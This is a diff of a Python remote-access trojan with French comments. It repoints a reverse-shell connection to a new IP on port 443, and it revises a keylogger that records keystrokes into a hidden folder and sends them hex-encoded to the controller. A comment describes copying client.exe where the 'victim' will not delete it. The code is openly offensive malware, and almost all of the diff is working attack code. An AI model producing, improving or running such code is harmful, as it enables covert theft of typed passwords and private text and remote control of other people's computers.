@@ -20,7 +20,6 @@ else:
 time_interval = 10
 text = ""
 
-
 # Configuration de l'environnement selon l'OS
 if platform.system() == "Windows":
     hidden_folder = os.path.join(os.getenv('APPDATA'), "SecretFolder", "keystrokes")
@@ -41,7 +40,6 @@ keystroke_file_path = ""
 
 # Variable pour suivre l'état de l'enregistrement
 is_recording = False
-
 
 
 #la fonction qui vas envoyer la resultat des commande executer 
@@ -74,7 +72,7 @@ def connection():
     while True:
         time.sleep(10)
         try:
-            s.connect(("192.168.100.9", 443))
+            s.connect(("192.168.1.37", 443))
             shell()
             break  # Exit loop after successful shell session
         except socket.error as e:
@@ -93,27 +91,31 @@ def record_keystrokes():
                 for event in events:
                     if event.event_type == 'down':  # Considérer uniquement les appuis
                         if event.name == 'tab':
-                            typed_text += '[Tab]\t'  # Ajouter une représentation lisible de Tab
+                            typed_text += '[Tab]\t'
                         elif event.name == 'enter':
-                            typed_text += '[ENTER]'  # Remplacer Enter par un indicateur
+                            typed_text += '[ENTER]'
                         elif event.name == 'backspace':
-                            if typed_text:  # Vérifier qu'il y a du texte à supprimer
-                                typed_text = typed_text[:-1] + '[BACKSPACE]'  # Supprimer et indiquer
+                            if typed_text:
+                                typed_text = typed_text[:-1] + '[BACKSPACE]'
                         elif event.name == 'space':
-                            typed_text += '[SPACE]'  # Ajouter une représentation pour Space
-                        elif len(event.name) == 1:  # Ajouter uniquement les caractères valides
+                            typed_text += '[SPACE]'
+                        elif len(event.name) == 1:
                             typed_text += event.name
                         else:
-                            continue  # Ignorer les autres touches comme Ctrl, Alt, etc.
+                            continue
 
                 # Filtrer les lignes inutiles
                 if not any(keyword in typed_text.lower() for keyword in ['haut']):
-                    if typed_text.strip():  # Vérifier qu'il reste du contenu pertinent
+                    if typed_text.strip():
                         data_file.write(typed_text + '\n')
+                        data_file.flush()  # Forcer l'écriture immédiate dans le fichier
 
-                time.sleep(0.1)  # Pause pour éviter de surcharger la CPU
+                time.sleep(0.1)
     except Exception as e:
         print(f"Error while recording keystrokes: {str(e)}")
+    finally:
+        if 'data_file' in locals():
+            data_file.close()  # Fermer explicitement le fichier
 
         
 
@@ -122,14 +124,6 @@ def start_keylogger():
     global is_recording, keystroke_file_path
     # Réinitialiser le chemin du fichier de frappes avec un nouveau fichier unique
     keystroke_file_path = get_new_keystroke_file_path()
-    
-    # Vider le fichier de frappes au début
-    try:
-        with open(keystroke_file_path, 'w') as data_file:
-            data_file.write("")  # Vider le contenu
-    except Exception as e:
-        print(f"Error resetting keystroke file: {str(e)}")
-    
     is_recording = True
     threading.Thread(target=record_keystrokes, daemon=True).start()
 
@@ -138,14 +132,26 @@ def start_keylogger():
 def stop_keylogger():
     global is_recording
     is_recording = False  
+    time.sleep(2)
     
 def send_keystrokes_file():
     try:
+        time.sleep(2)  # Délai pour s'assurer que le fichier est bien écrit
+        print(keystroke_file_path)
+        if os.path.getsize(keystroke_file_path) == 0:
+            print("Keystroke file is empty, skipping send.")
+            sending({"status": "error", "message": "File is empty."})
+            return
+
         with open(keystroke_file_path, 'rb') as file:
-            file_data = file.read().hex()  # Convertir le fichier en hexadécimal pour l'envoyer   
-        sending({"status": "success", "data": file_data})
+            file_data = file.read()
+            print(f"File data before hex conversion: {file_data}")  # Log pour vérifier les données
+            hex_data = file_data.hex()  # Convertir le fichier en hexadécimal pour l'envoyer
+            print(f"File data after hex conversion: {hex_data}")  # Log pour vérifier la conversion
+        sending({"status": "success", "data": hex_data})
     except Exception as e:
-        sending({"status": "error", "message": str(e)})    
+        sending({"status": "error", "message": str(e)})
+  
 
 #la fonction qui vas duppliquer le client.exe dans un emplacemment sain pour eviter de supprimer par le vicitme        
 def duplicate_client(client_path):
